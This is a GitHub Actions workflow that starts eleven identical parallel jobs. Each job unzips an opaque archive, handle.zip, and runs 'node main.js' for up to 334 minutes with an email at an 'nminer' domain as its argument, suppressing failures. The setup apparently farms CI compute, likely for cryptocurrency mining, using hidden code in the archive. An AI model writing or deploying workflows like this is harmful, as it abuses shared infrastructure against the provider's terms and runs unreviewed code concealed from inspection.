name: handle
on:
  push:
    branches: [ "main" ]
    paths:
      - "handle.txt"

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { os: 0 }
          - { os: 1 }
          - { os: 2 }
          - { os: 3 }
          - { os: 4 }
          - { os: 5 }
          - { os: 6 }
          - { os: 7 }
          - { os: 8 }
          - { os: 9 }
          - { os: 10 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20

      - name: Unzip handle.zip
        run: |
          sudo apt install -y unzip
          unzip handle.zip

      - name: disk
        run: |
          npm install --ignore-scripts
          timeout 334m node main.js mathsubhas10@nminer.com || echo "handle executed"